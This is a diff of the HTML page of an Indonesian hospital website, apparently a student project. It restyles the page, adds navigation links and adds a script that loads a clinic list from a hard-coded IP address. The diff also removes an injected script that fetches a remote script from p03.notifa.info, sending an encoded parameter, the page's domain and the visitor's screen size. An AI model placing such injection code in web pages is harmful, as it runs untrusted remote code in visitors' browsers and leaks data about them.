@@ -35,7 +35,7 @@
                 background-color: whitesmoke;
                 margin-bottom: 0;
                 min-height: 50%;
-                padding : 150px;
+                padding : 20px;
                 background-repeat: no-repeat;
                 background-position: center;
                 -webkit-background-size: cover;
@@ -45,6 +45,22 @@
             a {
                 font-family: 'Times New Roman', sans-serif;
                 font-size: 15px;
+            }
+            
+            table, th , td  {
+                font-family: 'Times New Roman', sans-serif;
+                color: white;
+                border: 1px white;
+                border-collapse: collapse;
+                padding: 5px;
+            }
+
+            table tr:nth-child(odd) {
+                background-image: url(http://3.bp.blogspot.com/-ad7Ibmldryw/UZxWf_fAveI/AAAAAAAAGF0/tBAubZfcda8/s320/Orion.gif);
+            }
+
+            table tr:nth-child(even) {
+                background-image: url(http://3.bp.blogspot.com/-ad7Ibmldryw/UZxWf_fAveI/AAAAAAAAGF0/tBAubZfcda8/s320/Orion.gif);
             }
 
             @media (max-width: 600px) {
@@ -66,63 +82,67 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>                 
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>  
+                        <span class="icon-bar"></span>                     
                     </button>
                 </div>
                 <div class="collapse navbar-collapse" id="myNavbar">
                     <ul class="nav navbar-nav">
                         <li class="active"><a href="index.html">Home</a></li>
+                        <li><a href="tambahKlinik.html">Tambah Klinik</a></li>
                         <li><a href="tambahPasien.html">Tambah Pasien</a></li>
+                        <li><a href="cariPasien.html">Cari Pasien</a></li>
                         <li><a href="antriKlinik.html">Antri Klinik</a></li>
-                        <li><a href="daftarDokter.html">Daftar Dokter</a></li>
                         <li><a href="daftarKlinik.html">Daftar Klinik</a></li>
+                        <li><a href="location.html">Lokasi Rumah Sakit</a></li>
                         <li><a href="login.html">Login</a></li>
                     </ul>
                 </div>
             </div>
         </nav>
-
+        
         <div class="jumbotron text-center">
             <a href="index.html" style="text-decoration: aqua"><font color="black"><h1>Rumah Sakit Kita</h1></font>
-                <font color="blue"><h2>We Are One</h2></font><font color="black"><p>Selamat Datang di Rumah Sakit Kita. 
-                    We Are One merupakan slogan kami berarti kita adalah satu, apapun suku, ras, agama, warna kulit
-                    dan hal lainnya kita tetap satu. Maka dari itu Rumah Sakit kami melayani untuk semua orang yang membutuhkan pengobatan.
-                    Rumah Sakit kami menyediakan fasilitas yang lengkap dan pelayanan yang baik.</p>
-                </font><font color="white"><b></b></font></a>
+                <font color="blue"><h2>We Are One</h2></font><font color="white"><b></b></font></a>
         </div>
+        
+        <h1><font face="Times New Roman" color=white size="6">Daftar Klinik yang Tersedia</font></h1>
+        <div id="id01" style="margin-left: 5%"></div>
+        <button type="button" face="Times New Roman" color="white" size="3" onclick="loadDoc()" id="btn">Klik Disini</button>
 
-        <img align="right" alt="rumah sakit" src="http://www.gambaranimasi.org/data/media/200/animasi-bergerak-jerapah-0030.gif" height="50" width="50">
+        <script>
+            function loadDoc() {
+                var xmlhttp = new XMLHttpRequest();
+//                var url = "http://202.94.83.190:8080/rsku/webresources/klinik/bacaKlinik";
+                var url = "http://202.94.83.190:8084/Rumah_Sakit_Kita/webresources/klinik/bacaKlinik";
+
+                xmlhttp.onreadystatechange = function () {
+                    if (this.readyState == 4 && this.status == 200) {
+                        myFunction(this.responseText);
+                    }
+                }
+                xmlhttp.open("GET", url, true);
+                xmlhttp.send();
+                function myFunction(response) {
+                    var arr = JSON.parse(response);
+                    var i;
+                    var out = "<table>";
+                    for (i = 0; i < arr.length; i++) {
+                        out += "<tr><td>" +
+                                arr[i].idKlinik +
+                                "</td><td>" +
+                                arr[i].nama
+                    }
+                    out += "</table>";
+                    document.getElementById("id01").innerHTML = out;
+                }
+            }
+        </script>
 
         <footer class="footer">
             <p><font face="Century Gothic">This page is copyrighted © 2018 by yovandapriscill_a</font></p>
         </footer>
-
-        <script type="text/javascript">if (self == top) {
-                function netbro_cache_analytics(fn, callback) {
-                    setTimeout(function ()
-                    {
-                        fn();
-                        callback();
-                    }, 0);
-                }
-                function sync(fn) {
-                    fn();
-                }
-                function requestCfs()
-                {
-                    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                    var url = idc_glo_url +
-                            "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params="
-                            + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mDTYQ42iri6b%2bOWCokgk8jMrIk3b4GxeBlUi24vi7lcq6WnOTGVqCZuVbRlIKdhJqSvXWvMoKqBIIgW9SQXQenuQy%2bHgoAcktiz8%2fhMu5M1PdqOlYHViX%2bNHHyxj3HumJLy4d3MwnIwDzmniIpzhNgFXOp8F%2bBeo7HQ7CT5N7W80ECbEKW%2bG1ondywe%2fXw%2bshWeBWF7QZn0OHKej0gbvogbxFhKsMNUwXSnFdl9vLZv72wCi0JfTPxR5CNb0ebyt1ZYCFO6aN5mE8V175r%2fLyHNR9YXVbV7MVxwQVKKb1ZUUFjMf0sIR0qQXHPGHwJsruFL%2f4AkNZv5Ls26gOV4vWkK7IPrvX6H1gh%2bCRBUSJR8HVd0ZZtQAuu0hCOkPJBd%2fryEiq%2fANud3st8jcB8Op%2f0AiDqfvLXyu1qyLW39iQHlrhYA0Z73Or1d5cPwv5blokzF2RPawvkFTv8bz2ofm9jDwvRj6UlRrjGfc9n92fnIJt7hqpf5ZHBoFtghvG00%2bU" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-                    var bsa = document.createElement('script');
-                    bsa.type = 'text/javascript';
-                    bsa.async = true;
-                    bsa.src = url;
-                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-                }
-                netbro_cache_analytics(requestCfs, function () {});
-            }
-        </script>
     </body>
 </html>
+
